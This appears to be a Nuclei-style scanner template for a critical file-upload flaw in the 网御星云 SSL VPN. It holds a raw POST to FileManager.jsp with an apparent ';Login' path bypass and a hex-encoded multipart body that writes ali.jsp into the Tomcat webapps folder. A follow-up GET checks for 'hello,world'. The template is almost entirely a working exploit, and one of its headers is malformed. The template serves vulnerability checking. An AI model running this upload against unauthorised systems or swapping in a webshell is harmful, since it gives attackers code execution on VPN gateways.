id: wangyu-ssl-vpn

info:
  name: 网御星云 SSL VPN 文件上传漏洞
  author: Str1am
  severity: critical
  tags: VPN,upload

requests:
  - raw:
      - |
        POST /SSL/admin/so/FileManager.jsp;Login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Content-Type": multipart/form-data; boundary=---------------------------14363957691640013656756907147
        Content-Length: 523
        Cookie: JSESSIONID=E30BF5A223214F728E6C669FB6FC2FEE

        2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D31343336333935373639313634303031333635363735363930373134370D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D22424153455F4E414D45220D0A0D0A2F73736C2F746F6D6361742F776562617070732F53534C0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D31343336333935373639313634303031333635363735363930373134370D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2275706C6F616446696C65223B2066696C656E616D653D22616C692E6A7370220D0A436F6E74656E742D547970653A20696D6167652F6A7065670D0A0D0A3C2520537472696E67207374723D2268656C6C6F2C776F726C64223B206F75742E7072696E7428737472293B20253E0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D31343336333935373639313634303031333635363735363930373134370D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D227375626D6974220D0A0D0A0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D31343336333935373639313634303031333635363735363930373134372D2D0D0A

      - |
        GET /SSL/ali.jsp HTTP/1.1
        Host: {{Hostname}} 
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "hello,world"
        part: body
        condition: or